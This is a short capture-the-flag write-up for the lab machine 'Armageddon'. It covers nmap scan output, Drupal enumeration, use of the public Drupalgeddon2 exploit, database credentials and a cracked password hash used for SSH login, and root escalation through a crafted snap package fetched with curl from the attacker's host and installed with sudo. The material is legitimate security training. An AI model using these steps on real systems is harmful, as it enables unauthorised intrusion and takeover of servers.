# Armageddon

### Nmap

```
22/tcp open  ssh     OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 82:c6:bb:c7:02:6a:93:bb:7c:cb:dd:9c:30:93:79:34 (RSA)
|   256 3a:ca:95:30:f3:12:d7:ca:45:05:bc:c7:f1:16:bb:fc (ECDSA)
|_  256 7a:d4:b3:68:79:cf:62:8a:7d:5a:61:e7:06:0f:5f:33 (ED25519)
80/tcp open  http    Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
| http-robots.txt: 36 disallowed entries (15 shown)
| /includes/ /misc/ /modules/ /profiles/ /scripts/ 
| /themes/ /CHANGELOG.txt /cron.php /INSTALL.mysql.txt 
| /INSTALL.pgsql.txt /INSTALL.sqlite.txt /install.php /INSTALL.txt 
|_/LICENSE.txt /MAINTAINERS.txt
|_http-generator: Drupal 7 (http://drupal.org)
|_http-favicon: Unknown favicon MD5: 1487A9908F898326EBABFFFD2407920D
|_http-title: Welcome to  Armageddon |  Armageddon
| http-methods: 
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
```

### Web Enum

```
http://10.10.10.233/README.txt -> Drupal

http://10.10.10.233/CHANGELOG.txt -> Drupal 7.58

http://10.10.10.233/includes/database/mysql/install.inc -> MySQL 5.0.15
```

### Exploitation

```bash
# public exploit
Drupal < 7.58 / < 8.3.9 / < 8.4.6 / < 8.5.1 - 'Drupalgeddon2' Remote Code Executionl | php/webapps/44449.rb
```

### Priv Esc

```bash

#/var/www/html/sites/default/settings.php
'database' => 'drupal',
'username' => 'drupaluser',
'password' => 'CQHEy@9M*m23gBVj',

# crack hash
brucetherealadmin:$S$DgL2gjv6ZtxBo6CdqZEyJuBphBmrCqIV6W97.oOsUf1xAhaadURt:booboo           (brucetherealadmin)
admin:$S$DRyjPBEPmjYSn1z2U2bdE1SvEpLiPxDzPVBuwLgpzUM4EyV1689i

# login brucetherealadmin through ssh
brucetherealadmin:booboo

# ref: https://blog.ikuamike.io/posts/2021/package_managers_privesc/#exploitation-snap

# make 
fpm -n xxxx -s dir -t snap -a all meta

# download packet and install
curl http://10.10.14.29:9000/xxxx_1.0_all.snap -o xxxx_1.0_all.snap
sudo snap install xxxx_1.0_all.snap --dangerous --devmode
```
